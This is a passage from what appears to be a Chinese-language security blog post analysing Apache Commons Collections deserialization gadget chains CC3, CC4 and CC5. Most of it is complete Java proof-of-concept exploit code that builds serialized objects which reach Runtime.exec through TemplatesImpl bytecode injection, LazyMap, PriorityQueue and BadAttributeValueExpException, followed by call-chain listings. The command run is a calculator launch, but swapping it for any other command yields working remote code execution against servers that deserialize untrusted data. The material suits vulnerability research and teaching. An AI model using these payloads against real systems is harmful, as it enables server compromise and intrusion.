TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        ChainedTransformer chain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates})</span><br><span class="line">        });</span><br><span class="line">        chain.transform(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="Gadget-chain-1"><a href="#Gadget-chain-1" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p>&#x4E0A;&#x8FF0;&#x7684; RCE demo &#x7ED3;&#x5408; CC1 &#x7684; LazyMap &#x5229;&#x7528;&#x94FE;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x51FA; CC3</p>
<p><strong>CC3 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer[] realPoc = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Class clz = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor construct = clz.getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, fakeChain);</span><br><span class="line">        Constructor handler_construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_construct.newInstance(Override.class, mapDemo);</span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="hljs-keyword">new</span> Class[]{Map.class}, map_handler);</span><br><span class="line">        Constructor AnnotationInvocationHandler_Construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Construct.newInstance(Override.class, proxy_map);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">				AnnotationInvocationHandler.readObject()</span><br><span class="line">					Map(Proxy).entrySet()</span><br><span class="line">						AnnotationInvocationHandler.invoke()</span><br><span class="line">							LazyMap.get()</span><br><span class="line">								ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InstantiateTransformer.transform()</span><br><span class="line">								newInstance()</span><br><span class="line">									TrAXFilter#TrAXFilter()</span><br><span class="line">									TemplatesImpl.newTransformer()</span><br><span class="line">											TemplatesImpl.getTransletInstance()</span><br><span class="line">											TemplatesImpl.defineTransletClasses</span><br><span class="line">											newInstance()</span><br><span class="line">												Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><h2 id="Basics-3"><a href="#Basics-3" class="headerlink" title="Basics"></a>Basics</h2><p>CC4 &#x6CA1;&#x6709;&#x65B0;&#x5229;&#x7528;&#x7684;&#x7C7B;&#xFF0C;CC2 &#x8DDF; CC3 &#x7ED3;&#x5408;&#x4E86;&#x4E00;&#x4E0B;</p>
<h2 id="Gadget-chain-2"><a href="#Gadget-chain-2" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p><strong>CC4 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC4</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer[] realPoc = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(fakeChain);</span><br><span class="line">        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);</span><br><span class="line">        Object[] queue_array = <span class="hljs-keyword">new</span> Object[]{templates, <span class="hljs-number">1</span>};</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// gadget</span></span><br><span class="line">        Field queue_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        queue_field.set(queue, queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        size.set(queue, <span class="hljs-number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		PriorityQueue.readObject()</span><br><span class="line">			PriorityQueue.heapify()</span><br><span class="line">				PriorityQueue.siftDown()</span><br><span class="line">					PriorityQueue.siftDownUsingComparator()</span><br><span class="line">						TransformingComparator.compare()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InstantiateTransformer.transform()</span><br><span class="line">								newInstance()</span><br><span class="line">									TrAXFilter#TrAXFilter()</span><br><span class="line">									TemplatesImpl.newTransformer()</span><br><span class="line">											TemplatesImpl.getTransletInstance()</span><br><span class="line">											TemplatesImpl.defineTransletClasses</span><br><span class="line">											newInstance()</span><br><span class="line">												Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h1><h2 id="Basics-4"><a href="#Basics-4" class="headerlink" title="Basics"></a>Basics</h2><p><strong>&#x9002;&#x7528;&#x7248;&#x672C;</strong>&#xFF1A;3.1-3.2.1&#xFF0C;JDK 1.8</p>
<p>CC1&#x3001;CC3 &#x9002;&#x7528;&#x4E8E; JDK7&#x7684;&#x73AF;&#x5883;&#xFF0C;&#x901A;&#x8FC7;&#x8C03;&#x7528; AnnotationInvocationHandler &#x5B9E;&#x73B0;&#x4E86; RCE&#xFF0C;&#x4F46;&#x662F; JDK8 &#x66F4;&#x65B0;&#x4E86; AnnotaionInvocationHandler &#x65B9;&#x6CD5;&#xFF0C;&#x4F7F;&#x5176; <code>memberValues</code> &#x53D8;&#x91CF;&#x4E0D;&#x4E3A;&#x6784;&#x9020;&#x7684; LazyMap &#x5B9E;&#x4F8B;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211151623182.png" alt></p>
<p>&#x56DE;&#x987E;&#x6211;&#x4EEC;&#x4E4B;&#x524D; CC1 &#x7684; RCE demo</p>
<p> <strong>CC1  LazyMap RCE demo</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo);</span><br><span class="line">        mapDemo.get(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6838;&#x5FC3;&#x8FD8;&#x662F;&#x8C03;&#x7528; LazyMap &#x7684; get &#x65B9;&#x6CD5;&#xFF0C;&#x7531;&#x6B64;&#x8C03;&#x7528;&#x524D;&#x9762;&#x5305;&#x88C5;&#x597D;&#x7684; ChainedTransformer &#x7684; transform &#x65B9;&#x6CD5;&#x3002;&#x90A3;&#x4E48;&#x73B0;&#x5728;&#x6838;&#x5FC3;&#x76EE;&#x7684;&#x8FD8;&#x662F;&#x5BFB;&#x627E;&#x5230;&#x67D0;&#x4E2A;&#x7C7B;&#x53EF;&#x4EE5;&#x4F20;&#x5165;&#x4E00;&#x4E2A; Map &#x5BF9;&#x8C61;&#xFF0C;&#x540C;&#x65F6;&#x7C7B;&#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#x9700;&#x8981;&#x8C03;&#x7528; Map &#x5BF9;&#x8C61;&#x7684; get &#x65B9;&#x6CD5;</p>
<h2 id="Gadget-chain-3"><a href="#Gadget-chain-3" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p><strong>Level-1 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        rceDemo.getValue();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E0A;&#x8FF0;&#x7684; <code>TiedMapEntry#getValue</code> &#x8C03;&#x7528;&#x4E86;&#x4F20;&#x5165;&#x7684; Map &#x5BF9;&#x8C61;&#x7684;  get &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211153944181.png" alt></p>
<p>&#x8FD8;&#x662F;&#x8DDF;&#x4E4B;&#x524D;&#x7684;&#x601D;&#x8DEF;&#x4E00;&#x6837;&#xFF0C;&#x9700;&#x8981;&#x8DDF;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7ED3;&#x5408;&#x7684;&#x8BDD;&#xFF0C;&#x9700;&#x8981;&#x7EE7;&#x7EED;&#x6784;&#x9020;</p>
<p><strong>fake CC5 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException finaldemo = <span class="hljs-keyword">new</span> BadAttributeValueExpException(rceDemo);</span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(finaldemo);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
